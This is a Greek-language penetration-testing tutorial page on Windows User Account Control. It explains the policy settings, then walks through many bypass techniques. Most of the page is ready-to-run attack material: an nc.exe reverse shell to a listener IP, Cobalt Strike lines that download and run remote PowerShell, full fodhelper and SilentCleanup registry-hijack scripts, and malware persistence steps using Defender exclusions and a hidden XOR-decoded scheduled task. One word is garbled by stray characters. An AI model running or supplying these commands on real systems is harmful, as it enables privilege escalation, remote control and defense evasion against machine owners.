# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **μήνυμα συναίνεσης για δραστηριότητες με αυξημένα δικαιώματα**. Οι εφαρμογές διαθέτουν διαφορετικά επίπεδα `integrity` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν δυνητικά να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες εκτελούνται πάντα **στο πλαίσιο ασφαλείας ενός λογαριασμού που δεν είναι διαχειριστής**, εκτός εάν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να αποκτήσουν πρόσβαση επιπέδου διαχειριστή στο σύστημα για να εκτελεστούν. Πρόκειται για μια δυνατότητα ευκολίας που προστατεύει τους διαχειριστές από μη σκόπιμες αλλαγές, αλλά δεν θεωρείται security boundary.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν υπάρχει UAC, σε έναν χρήστη-διαχειριστή δίνονται 2 tokens: ένα standard user token, για την εκτέλεση κανονικών ενεργειών με medium integrity, και ένα με τα admin privileges.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) εξηγεί σε μεγάλο βάθος τον τρόπο λειτουργίας του UAC και περιλαμβάνει τη διαδικασία logon, την εμπειρία χρήστη και την αρχιτεκτονική του UAC.<sup>[[2]](#references)</sup> Οι διαχειριστές μπορούν να χρησιμοποιήσουν security policies για να ρυθμίσουν τον τρόπο λειτουργίας του UAC σύμφωνα με τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc) ή να το ρυθμίσουν και να το διανείμουν μέσω Group Policy Objects (GPO) σε περιβάλλον Active Directory domain. Οι διάφορες ρυθμίσεις αναλύονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 Group Policy settings που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει επιπλέον λεπτομέρειες:

| Ρύθμιση Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Προεπιλεγμένη ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Εμφάνιση μηνύματος συναίνεσης για non-Windows binaries στην ασφαλή επιφάνεια εργασίας) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Εμφάνιση μηνύματος για credentials στην ασφαλή επιφάνεια εργασίας)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ενεργοποιημένο· απενεργοποιημένο από προεπιλογή στο Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ενεργοποιημένο)                                              |

### Policies for installing software on Windows

Οι **τοπικές security policies** ("secpol.msc" στα περισσότερα συστήματα) είναι ρυθμισμένες από προεπιλογή ώστε να **εμποδίζουν χρήστες που δεν είναι διαχειριστές να πραγματοποιούν εγκαταστάσεις software**. Αυτό σημαίνει ότι, ακόμη και αν ένας χρήστης που δεν είναι διαχειριστής μπορεί να κατεβάσει τον installer του software σας, δεν θα μπορεί να τον εκτελέσει χωρίς λογαριασμό διαχειριστή.

### Registry Keys to Force UAC to Ask for Elevation

Ως standard user χωρίς admin rights, μπορείτε να διασφαλίσετε ότι ο "standard" λογαριασμός θα **καλείται από το UAC να εισαγάγει credentials** όταν επιχειρεί να εκτελέσει συγκεκριμένες ενέργειες. Αυτή η ενέργεια απαιτεί την τροποποίηση ορισμένων **registry keys**, για τα οποία χρειάζεστε admin permissions, εκτός εάν υπάρχει **UAC bypass** ή ο attacker είναι ήδη logged in ως admin.

Ακόμη και αν ο χρήστης ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές αναγκάζουν τον χρήστη να **εισαγάγει ξανά τα credentials του λογαριασμού του** για την εκτέλεση administrative actions.

**Στην πράξη, αυτό είναι χρήσιμο μόνο όταν έχετε ήδη ένα elevated token, ένα UAC bypass ή μια misconfiguration που σας επιτρέπει να αλλάξετε αυτά τα keys· διαφορετικά, το ίδιο το registry write αποκλείεται.**

Τα registry keys και οι entries που πρέπει να αλλάξετε είναι τα ακόλουθα (με τις προεπιλεγμένες τιμές τους σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί να γίνει και χειροκίνητα μέσω του εργαλείου Local Security Policy. Μετά την αλλαγή, οι administrative operations ζητούν από τον χρήστη να εισαγάγει ξανά τα credentials του.

### Note

**Το User Account Control δεν αποτελεί security boundary.** Επομένως, οι standard users δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν δικαιώματα διαχειριστή χωρίς local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Προνόμια UAC

- Το Internet Explorer Protected Mode χρησιμοποιεί ελέγχους ακεραιότητας για να αποτρέπει την πρόσβαση διεργασιών υψηλού επιπέδου ακεραιότητας (όπως τα web browsers) σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως ο φάκελος προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται με την εκτέλεση του browser με token χαμηλής ακεραιότητας. Όταν ο browser επιχειρεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη ζώνη χαμηλής ακεραιότητας, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η λειτουργία συμβάλλει στην αποτροπή επιθέσεων απομακρυσμένης εκτέλεσης κώδικα από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα προνόμια του χρήστη. Τα προνόμια ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα credentials του χρήστη, δηλαδή τα credentials που χρησιμοποιούνται για την authentication του χρήστη στον υπολογιστή και σε πόρους του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να συνδέουν αυτόματα έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο σε περιβάλλοντα kiosk ή για σκοπούς testing. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει τον κωδικό πρόσβασης στο registry.

Ορίστε τα ακόλουθα keys χρησιμοποιώντας τον Registry Editor ή το `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε τη φυσιολογική συμπεριφορά σύνδεσης, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε graphical access στο victim, το UAC bypass είναι straightforward, καθώς μπορείτε απλώς να κάνετε click στο "Yes" όταν εμφανιστεί το UAC prompt

Το UAC bypass απαιτείται στην ακόλουθη περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε context μεσαίας ακεραιότητας και ο χρήστης σας ανήκει στην ομάδα administrators**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ δυσκολότερο να γίνει bypass του UAC όταν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always), σε σχέση με οποιοδήποτε από τα άλλα επίπεδα (Default).**

### Γρήγορο triage από shell μεσαίας ακεραιότητας

Πριν επιχειρήσετε bypass, επιβεβαιώστε ότι βρίσκεστε στο σωστό σενάριο και αντιστοιχίστε το build του host με γνωστές working methods:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Πρακτικές σημειώσεις:
- Αν `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας high integrity.
- Τα `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Το `Always Notify` αυξάνει τον βαθμό δυσκολίας, αλλά θα πρέπει και πάλι να δοκιμάζετε το ακριβές build αντί να υποθέτετε αποτυχία: το UACME εξακολουθεί να καταγράφει ορισμένες μεθόδους `AlwaysNotify compatible` σε σύγχρονα Windows builds.<sup>[[3]](#references)</sup>

### Το UAC απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε ένα reverse shell με δικαιώματα admin** (high integrity level) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass με token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + επαναχρησιμοποιήσιμο debug object

Το local RPC interface `201ef99a-7fa0-444c-9399-19ba84f12a1a` μπορεί να δημιουργήσει μια διεργασία με ενεργοποιημένο debugging. Οι διεργασίες που δημιουργούνται μέσω debugging στο ίδιο thread μοιράζονται το debug object του thread· ένα creation debug event περιλαμβάνει ένα process handle πλήρους πρόσβασης, ακόμη και όταν το ίδιο το αποτέλεσμα του RPC παρέχει μόνο περιορισμένη πρόσβαση. Αυτό μετατρέπει την επαναχρησιμοποίηση debug object σε UAC primitive για ένα μέλος της ομάδας Administrators με medium-integrity.<sup>[[11]](#references)[[12]](#references)</sup>

Μια πρακτική αλυσίδα είναι η εξής:<sup>[[11]](#references)[[12]](#references)</sup>

1. Καλέστε τη local RPC method (άμεσα ή μέσω `NdrAsyncClientCall`) για να δημιουργήσετε μια sacrificial διεργασία χωρίς elevation και με ενεργοποιημένο debugging.
2. Κάντε query το `ProcessDebugObjectHandle` με `NtQueryInformationProcess`, αποσυνδέστε το με `NtRemoveProcessDebug`, διατηρήστε το object και τερματίστε τη sacrificial διεργασία.
3. Χρησιμοποιήστε το ίδιο RPC interface για να δημιουργήσετε μια trusted auto-elevated διεργασία και, στη συνέχεια, συσχετίστε το αποθηκευμένο object με το calling thread μέσω του `DbgUiSetThreadDebugObject`.
4. Καλέστε το `WaitForDebugEvent` και λάβετε το process handle του `CREATE_PROCESS_DEBUG_EVENT`· κάντε duplicate το με `NtDuplicateObject` πριν συνεχίσετε.
5. Παρέχετε το duplicated handle στο `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` και εκκινήστε το payload με μια extended startup-info structure. Αυτό επαναχρησιμοποιεί το elevated process context και δίνει επίσης στο child μια parent relationship που φαίνεται trusted.

Αναζητήστε τη σύντομη ακολουθία και όχι μόνο το auto-elevated binary: δημιουργία διεργασίας μέσω local AppInfo RPC, queries του `ProcessDebugObjectHandle`, debugger detach/reattach, ένα immediate creation-debug event, handle duplication και ένα child του οποίου ο καταγεγραμμένος parent δεν αντιστοιχεί στη διεργασία που εκτέλεσε τα creation APIs.<sup>[[12]](#references)</sup>

### **Πολύ** Basic UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε shell με έναν χρήστη που ανήκει στην ομάδα Administrators, μπορείτε να **κάνετε mount το C$** shared μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε ολόκληρο το file system** (ακόμη και στον home folder του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το trick δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass με cobalt strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν έχει ρυθμιστεί στο μέγιστο επίπεδο ασφαλείας
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Τα COM objects με auto-elevation παραμένουν ένα πρακτικό UAC surface σε σύγχρονες εκδόσεις. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στις τρέχουσες εκδόσεις των Windows, ενώ τα offensive εργαλεία συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια διεργασία στο interactive desktop, εκτέλεση 64-bit και, μερικές φορές, PEB/process masquerading πριν από την κλήση του COM Elevation Moniker.<sup>[[3]](#references)</sup>

Πρακτικές συμβουλές:
- Προτιμήστε μια **64-bit** διεργασία στο **interactive session** του χρήστη (συνήθως το `explorer.exe` ή ένα child process του).
- Αν ένα raw shell αποτύχει, δοκιμάστε ξανά από ένα BOF / UACME implementation αντί για ένα naive `CreateProcess` wrapper.
- Αναμένετε η εκτέλεση του child να γίνει σε μια **ξεχωριστή elevated process**· πολλά BOFs δεν κάνουν elevate το τρέχον beacon in-place.

### KRBUACBypass

Documentation και tool στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

Το [**UACME**](https://github.com/hfiref0x/UACME) είναι μια συλλογή τεχνικών UAC bypass. Κάντε compile με Visual Studio ή MSBuild· το build δημιουργεί αρκετά executables (για παράδειγμα, `Source\Akagi\output\x64\Debug\Akagi.exe`), επομένως επιλέξτε τη μέθοδο που είναι κατάλληλη για το target build.<sup>[[3]](#references)</sup>\
Προσοχή: ορισμένα bypasses εκκινούν ορατά προγράμματα ή prompts που μπορεί να ειδοποιήσουν τον χρήστη.<sup>[[3]](#references)</sup>

Το UACME περιλαμβάνει το **build version από το οποίο άρχισε να λειτουργεί κάθε technique**.<sup>[[3]](#references)</sup> Μπορείτε να αναζητήσετε μια technique που επηρεάζει τις εκδόσεις σας:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [αυτή](https://en.wikipedia.org/wiki/Windows_10_version_history) τη σελίδα, βρίσκετε την έκδοση Windows `1607` από τις εκδόσεις build.

Μια πρακτική ροή εργασίας είναι πρώτα να **αξιολογήσετε το build του host** και μόνο έπειτα να εκτελέσετε την αντίστοιχη μέθοδο:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- Το `WinPwnage` συγκρίνει γρήγορα το local build με τις γνωστές UAC methods, κάτι που είναι χρήσιμο για την άμεση απόρριψη νεκρών PoCs.<sup>[[4]](#references)</sup>
- Το `UACME` παραμένει ο καλύτερος public κατάλογος για την αντιστοίχιση ενός bypass με ένα συγκεκριμένο build. Η έκδοση 3.7.1 πρόσθεσε τις methods 83–85, ενώ η προηγούμενη release επανέλεγξε τις υπάρχουσες methods έναντι του **Windows 11 25H2**· ελέγξτε ξανά τον πίνακα methods και τα release notes, αντί να θεωρείτε ότι ένα παλιό PoC εξακολουθεί να εφαρμόζεται χωρίς αλλαγές.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess chains συμβατά με Always Notify (UACME 3.7.1)

Το `Always Notify` δεν εξαλείφει κάθε UAC bypass. Το UACME 3.7.1 υλοποιεί τρεις νέες x64 methods που συνδυάζουν user-controlled environment/protocol state με elevated scheduled-task ή UIAccess behavior και τις χαρακτηρίζει όλες ως `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** ανακατευθύνετε το `SystemRoot`, ώστε το WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` να κάνει το elevated `taskhostw.exe` side-load το `unifiedconsent.dll`. Το UACME την παρακολουθεί από το Windows 10 build 19041.
- **84 — TabTip:** χρησιμοποιήστε το ίδιο environment-variable primitive εναντίον του UIAccess `TabTip.exe`, το οποίο φορτώνει τα `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ή `rsaenh.dll`, ανάλογα με το build, και στη συνέχεια κάντε pivot από το resulting high-integrity UIAccess context. Το UACME την παρακολουθεί από τα Windows 8.1 / Server 2016.
- **85 — Narrator:** κάντε hijack το per-user `feedback-hub` protocol, χειριστείτε το Narrator με `Alt+CapsLock+F` και, στη συνέχεια, εκκινήστε ένα writable αντίγραφο του `osk.exe`, το οποίο κάνει side-load το `OskSupport.dll`. Αυτό απαιτεί interactive desktop και παρακολουθείται από τα Windows 10 1809 / Server 2019.

Αφού δημιουργήσετε τα payload units και το Akagi όπως τεκμηριώνεται από το UACME, καλέστε τον αντίστοιχο αριθμό method (η προαιρετική εντολή έχει ως προεπιλογή το `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Οι μέθοδοι 84 και 85 εξαρτώνται από τα UIAccess/desktop interaction, επομένως μην περιμένετε να λειτουργήσουν χωρίς αλλαγές από το Session 0 ή από ένα non-interactive service shell. Και οι τρεις τροποποιούν την κατάσταση environment/protocol και τοποθετούν DLLs· ελέγξτε την υλοποίηση και αφαιρέστε αυτά τα artifacts μετά τη δοκιμή.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Το trusted binary `fodhelper.exe` εκτελείται με auto-elevated δικαιώματα σε σύγχρονα Windows. Κατά την εκκίνησή του, αναζητά την παρακάτω per-user διαδρομή μητρώου χωρίς να επικυρώνει το verb `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διεργασία Medium Integrity (ο χρήστης ανήκει στους Administrators) να κάνει spawn μιας διεργασίας High Integrity χωρίς prompt του UAC.

Διαδρομή μητρώου που αναζητά το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και, στη συνέχεια, ενεργοποιήστε το)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι προεπιλεγμένο/ελαστικό (όχι Always Notify με πρόσθετους περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια 32-bit διεργασία σε 64-bit Windows.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή EXE). Αποφύγετε τα UIs που εμφανίζουν prompts για stealth.

#### CurVer/extension hijack παραλλαγή (HKCU only)

Πρόσφατα δείγματα που κάνουν abuse στο `fodhelper.exe` αποφεύγουν το `DelegateExecute` και αντ' αυτού **ανακατευθύνουν το `ms-settings` ProgID** μέσω της τιμής `CurVer` ανά χρήστη. Το auto-elevated binary εξακολουθεί να επιλύει τον handler υπό το `HKCU`, επομένως δεν απαιτείται admin token για την τοποθέτηση των keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μόλις αποκτήσει elevated δικαιώματα, το malware συνήθως **απενεργοποιεί τις μελλοντικές προτροπές** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0` και στη συνέχεια εκτελεί πρόσθετο defense evasion (π.χ. `Add-MpPreference -ExclusionPath C:\ProgramData`) και αναδημιουργεί το persistence ώστε να εκτελείται με υψηλή ακεραιότητα. Μια τυπική εργασία persistence αποθηκεύει στον δίσκο ένα **κρυπτογραφημένο με XOR PowerShell script** και το αποκωδικοποιεί/εκτελεί στη μνήμη κάθε ώρα:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το **dropper** και να αφήνει μόνο τα staged payloads, με αποτέλεσμα η ανίχνευση να βασίζεται στην παρακολούθηση του **`CurVer` hijack**, του tampering του `ConsentPromptBehaviorAdmin`, στη δημιουργία Defender exclusion ή σε scheduled tasks που κάνουν in-memory decrypt στο PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass μέσω `SilentCleanup` task (`HKCU\Environment\windir`)

Το `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα privileges και επεκτείνει το `%windir%` από το user environment. Αν ελέγχετε το `HKCU\Environment\windir`, μπορείτε να ανακατευθύνετε αυτή την επέκταση σε μια arbitrary command και να αποκτήσετε high integrity χωρίς consent dialog.<sup>[[8]](#references)</sup> Αυτή η μέθοδος εξακολουθεί να αξίζει testing σε πρόσφατα builds, επειδή το UACME διατηρεί την τεχνική ενεργή και το πρόσφατο issue tracking δείχνει ότι τα Windows 11 24H2 μπορεί να απαιτούν μόνο μικρές προσαρμογές στα quotes.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Αν η εργασία παραθέτει τη διαδρομή σε εκείνο το build, δοκιμάστε ξανά με το payload να τελειώνει σε εισαγωγικό (για παράδειγμα `cmd.exe"`). Να καθαρίζετε πάντα το `HKCU\Environment\windir` μετά τη δοκιμή.

#### Περισσότερα UAC bypass

Πολλά κλασικά UAC bypasses που κάνουν abuse σε ροές UI, αντικείμενα COM ή αλληλεπίδραση με την επιφάνεια εργασίας απαιτούν μια **πλήρη interactive session** με το θύμα· ένα συνηθισμένο shell μέσω `nc.exe` ή μια υπηρεσία που εκτελείται στο **Session 0** συχνά δεν επαρκεί.

Μπορείτε συχνά να το解决σετε χρησιμοποιώντας μια **meterpreter** session. Κάντε migrate σε μια **διεργασία** που έχει την τιμή **Session** ίση με **1**:

![Ορίστε το ms-settings σε μια προσαρμοσμένη επέκταση (.thm) και αντιστοιχίστε αυτή την επέκταση στο payload μας - Περισσότερα UAC bypass: Μπορείτε να το επιτύχετε χρησιμοποιώντας μια meterpreter session. Κάντε migrate σε μια διεργασία που έχει το Session...](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

